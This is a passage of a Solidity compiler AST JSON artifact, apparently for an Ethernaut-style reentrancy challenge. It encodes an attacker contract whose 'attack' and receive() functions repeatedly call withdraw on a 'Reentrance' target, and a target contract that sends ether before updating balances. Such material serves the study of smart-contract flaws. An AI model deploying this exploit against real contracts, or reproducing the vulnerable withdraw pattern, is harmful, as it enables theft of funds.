																	"typeIdentifier": "t_function_external_payable$_t_address_$returns$__$value",
																	"typeString": "function (address) payable external"
																}
															},
															"id": 20,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "gas",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "275:26:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_setgas_pure$_t_uint256_$returns$_t_function_external_payable$_t_address_$returns$__$gasvalue_$value",
																"typeString": "function (uint256) pure returns (function (address) payable external)"
															}
														},
														"id": 22,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "275:35:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_payable$_t_address_$returns$__$gasvalue",
															"typeString": "function (address) payable external"
														}
													},
													"id": 27,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "275:50:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 28,
												"nodeType": "ExpressionStatement",
												"src": "275:50:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "d7bb99ba",
									"id": 30,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "contribute",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 11,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "247:2:0"
									},
									"returnParameters": {
										"id": 12,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "265:0:0"
									},
									"scope": 70,
									"src": "228:104:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 49,
										"nodeType": "Block",
										"src": "362:118:0",
										"statements": [
											{
												"assignments": [
													34,
													36
												],
												"declarations": [
													{
														"constant": false,
														"id": 34,
														"name": "success",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 49,
														"src": "373:12:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 33,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "373:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													{
														"constant": false,
														"id": 36,
														"name": "result",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 49,
														"src": "387:19:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 35,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "387:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 48,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"hexValue": "77697468647261772875696e7429",
																	"id": 44,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "string",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "450:16:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_stringliteral_8ba145622f34537cd34250893bdfcf5d32d8f9b6d688b3406fa3127952ad2f05",
																		"typeString": "literal_string \"withdraw(uint)\""
																	},
																	"value": "withdraw(uint)"
																},
																{
																	"argumentTypes": null,
																	"hexValue": "313030",
																	"id": 45,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "468:3:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_100_by_1",
																		"typeString": "int_const 100"
																	},
																	"value": "100"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_stringliteral_8ba145622f34537cd34250893bdfcf5d32d8f9b6d688b3406fa3127952ad2f05",
																		"typeString": "literal_string \"withdraw(uint)\""
																	},
																	{
																		"typeIdentifier": "t_rational_100_by_1",
																		"typeString": "int_const 100"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"id": 42,
																	"name": "abi",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 495,
																	"src": "426:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_abi",
																		"typeString": "abi"
																	}
																},
																"id": 43,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"memberName": "encodeWithSignature",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "426:23:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_abiencodewithsignature_pure$_t_string_memory_ptr_$returns$_t_bytes_memory_ptr_$",
																	"typeString": "function (string memory) pure returns (bytes memory)"
																}
															},
															"id": 46,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "426:46:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 39,
																	"name": "r",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 7,
																	"src": "418:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_Reentrance_$152",
																		"typeString": "contract Reentrance"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_Reentrance_$152",
																		"typeString": "contract Reentrance"
																	}
																],
																"id": 38,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "410:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": {
																	"id": 37,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "410:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": null,
																		"typeString": null
																	}
																}
															},
															"id": 40,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "410:10:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"id": 41,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "call",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "410:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
															"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
														}
													},
													"id": 47,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "410:63:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
														"typeString": "tuple(bool,bytes memory)"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "372:101:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "9e5faafc",
									"id": 50,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "attack",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 31,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "352:2:0"
									},
									"returnParameters": {
										"id": 32,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "362:0:0"
									},
									"scope": 70,
									"src": "337:143:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 68,
										"nodeType": "Block",
										"src": "512:90:0",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 59,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 55,
																	"name": "r",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 7,
																	"src": "534:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_Reentrance_$152",
																		"typeString": "contract Reentrance"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_Reentrance_$152",
																		"typeString": "contract Reentrance"
																	}
																],
																"id": 54,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "526:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": {
																	"id": 53,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "526:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": null,
																		"typeString": null
																	}
																}
															},
															"id": 56,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "526:10:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"id": 57,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "balance",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "526:18:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 58,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "548:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "526:23:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 67,
												"nodeType": "IfStatement",
												"src": "522:74:0",
												"trueBody": {
													"id": 66,
													"nodeType": "Block",
													"src": "552:44:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 63,
																		"name": "amount",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 10,
																		"src": "577:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	],
																	"expression": {
																		"argumentTypes": null,
																		"id": 60,
																		"name": "r",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 7,
																		"src": "566:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_Reentrance_$152",
																			"typeString": "contract Reentrance"
																		}
																	},
																	"id": 62,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "withdraw",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 147,
																	"src": "566:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_external_nonpayable$_t_uint256_$returns$__$",
																		"typeString": "function (uint256) external"
																	}
																},
																"id": 64,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "566:18:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 65,
															"nodeType": "ExpressionStatement",
															"src": "566:18:0"
														}
													]
												}
											}
										]
									},
									"documentation": null,
									"id": 69,
									"implemented": true,
									"kind": "receive",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 51,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "492:2:0"
									},
									"returnParameters": {
										"id": 52,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "512:0:0"
									},
									"scope": 70,
									"src": "485:117:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 71,
							"src": "85:519:0"
						}
					],
					"src": "32:572:0"
				},
				"id": 0
			},
			"contracts/Reentrance.sol": {
				"ast": {
					"absolutePath": "contracts/Reentrance.sol",
					"exportedSymbols": {
						"Reentrance": [
							152
						]
					},
					"id": 153,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 72,
							"literals": [
								"solidity",
								"^",
								"0.6",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "32:23:1"
						},
						{
							"absolutePath": "github/OpenZeppelin/openzeppelin-contracts/contracts/math/SafeMath.sol",
							"file": "github/OpenZeppelin/openzeppelin-contracts/contracts/math/SafeMath.sol",
							"id": 73,
							"nodeType": "ImportDirective",
							"scope": 153,
							"sourceUnit": 494,
							"src": "57:80:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 152,
							"linearizedBaseContracts": [
								152
							],
							"name": "Reentrance",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"id": 76,
									"libraryName": {
										"contractScope": null,
										"id": 74,
										"name": "SafeMath",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 493,
										"src": "172:8:1",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_SafeMath_$493",
											"typeString": "library SafeMath"
										}
									},
									"nodeType": "UsingForDirective",
									"src": "166:27:1",
									"typeName": {
										"id": 75,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "185:7:1",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									}
								},
								{
									"constant": false,
									"functionSelector": "27e235e3",
									"id": 80,
									"name": "balances",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 152,
									"src": "196:40:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
										"typeString": "mapping(address => uint256)"
									},
									"typeName": {
										"id": 79,
										"keyType": {
											"id": 77,
											"name": "address",
											"nodeType": "ElementaryTypeName",
											"src": "204:7:1",
											"typeDescriptions": {
												"typeIdentifier": "t_address",
												"typeString": "address"
											}
										},
										"nodeType": "Mapping",
										"src": "196:24:1",
										"typeDescriptions": {
											"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
											"typeString": "mapping(address => uint256)"
										},
										"valueType": {
											"id": 78,
											"name": "uint",
											"nodeType": "ElementaryTypeName",
											"src": "215:4:1",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											}
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 97,
										"nodeType": "Block",
										"src": "285:55:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 95,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 85,
															"name": "balances",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 80,
															"src": "291:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 87,
														"indexExpression": {
															"argumentTypes": null,
															"id": 86,
															"name": "_to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 82,
															"src": "300:3:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "291:13:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 92,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 508,
																	"src": "325:3:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 93,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "value",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "325:9:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 88,
																	"name": "balances",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 80,
																	"src": "307:8:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 90,
																"indexExpression": {
																	"argumentTypes": null,
																	"id": 89,
																	"name": "_to",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 82,
																	"src": "316:3:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "307:13:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 91,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "add",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 327,
															"src": "307:17:1",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 94,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "307:28:1",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "291:44:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 96,
												"nodeType": "ExpressionStatement",
												"src": "291:44:1"
											}
										]
									},
									"documentation": null,
									"functionSelector": "00362a95",
									"id": 98,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "donate",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 83,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 82,
												"name": "_to",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 98,
												"src": "257:11:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 81,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "257:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "256:13:1"
									},
									"returnParameters": {
										"id": 84,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "285:0:1"
									},
									"scope": 152,
									"src": "241:99:1",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 109,
										"nodeType": "Block",
										"src": "412:32:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"baseExpression": {
														"argumentTypes": null,
														"id": 105,
														"name": "balances",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 80,
														"src": "425:8:1",
														"typeDescriptions": {
															"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
															"typeString": "mapping(address => uint256)"
														}
													},
													"id": 107,
													"indexExpression": {
														"argumentTypes": null,
														"id": 106,
														"name": "_who",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 100,
														"src": "434:4:1",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "IndexAccess",
													"src": "425:14:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 104,
												"id": 108,
												"nodeType": "Return",
												"src": "418:21:1"
											}
										]
									},
									"documentation": null,
									"functionSelector": "70a08231",
									"id": 110,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "balanceOf",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 101,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 100,
												"name": "_who",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 110,
												"src": "363:12:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 99,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "363:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "362:14:1"
									},
									"returnParameters": {
										"id": 104,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 103,
												"name": "balance",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 110,
												"src": "398:12:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 102,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "398:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "397:14:1"
									},
									"scope": 152,
									"src": "344:100:1",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 146,
										"nodeType": "Block",
										"src": "487:195:1",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 120,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 115,
															"name": "balances",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 80,
															"src": "496:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 118,
														"indexExpression": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 116,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 508,
																"src": "505:3:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 117,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "505:10:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "IndexAccess",
														"src": "496:20:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">=",
													"rightExpression": {
														"argumentTypes": null,
														"id": 119,
														"name": "_amount",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 112,
														"src": "520:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "496:31:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 145,
												"nodeType": "IfStatement",
												"src": "493:185:1",
												"trueBody": {
													"id": 144,
													"nodeType": "Block",
													"src": "529:149:1",
													"statements": [
														{
															"assignments": [
																122,
																null
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 122,
																	"name": "result",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 144,
																	"src": "538:11:1",
																	"stateVariable": false,
																	"storageLocation": "default",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"typeName": {
																		"id": 121,
																		"name": "bool",
																		"nodeType": "ElementaryTypeName",
																		"src": "538:4:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																},
																null
															],
															"id": 131,
															"initialValue": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"hexValue": "",
																		"id": 129,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "string",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "585:2:1",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																			"typeString": "literal_string \"\""
																		},
																		"value": ""
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																			"typeString": "literal_string \"\""
																		}
																	],
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 127,
																			"name": "_amount",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 112,
																			"src": "576:7:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"expression": {
																				"argumentTypes": null,
																				"expression": {
																					"argumentTypes": null,
																					"id": 123,
																					"name": "msg",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 508,
																					"src": "554:3:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_magic_message",
																						"typeString": "msg"
																					}
																				},
																				"id": 124,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"memberName": "sender",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": null,
																				"src": "554:10:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_address_payable",
																					"typeString": "address payable"
																				}
																			},
																			"id": 125,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"memberName": "call",
																			"nodeType": "MemberAccess",
																			"referencedDeclaration": null,
																			"src": "554:15:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
																				"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
																			}
																		},
																		"id": 126,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "value",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": null,
																		"src": "554:21:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_setvalue_pure$_t_uint256_$returns$_t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$value_$",
																			"typeString": "function (uint256) pure returns (function (bytes memory) payable returns (bool,bytes memory))"
																		}
																	},
																	"id": 128,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "554:30:1",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$value",
																		"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
																	}
